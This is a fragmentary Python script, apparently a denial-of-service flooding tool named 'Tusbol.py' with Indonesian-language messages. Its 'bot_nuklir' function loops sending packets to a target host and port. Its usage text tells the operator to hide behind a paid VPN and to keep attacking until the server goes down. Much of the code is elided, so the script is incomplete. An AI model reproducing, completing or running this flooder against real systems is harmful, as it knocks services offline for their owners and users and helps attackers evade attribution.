...
def bot_nuklir(url):
	try:
		while True:
			...
			print("\033[94mSedang Mengirim Paket_- ...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				...
				s.shutdown(1)
				print("\033[91mBerhenti Detected_- \033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mServer Has Been Error! Server Down\033[0m")
...
def usage():
	...
	\033[92mJangan Lupa Pake VPN (Jangan VPN Gratisan)
	...
	•) NOTE : Attack Sampai Down Baru CTRL+C
  
	Cara Pakai : python Tusbol.py [-s] [-p] [-t]
	Contoh     :
	python3 Tusbol.py -s \033[93m192.168.0.1 \033[92m-p \033[93m80 \033[92m-t \033[93m135	
	\033[92m-h : help
	-s : alamat ip target
...
if __name__ == '__main__':
	...
	try:
		...
		print("\033[91mAda Yang Salah Goblok_-  Cek IP dan Port\033[0m")
		usage()
	while True:
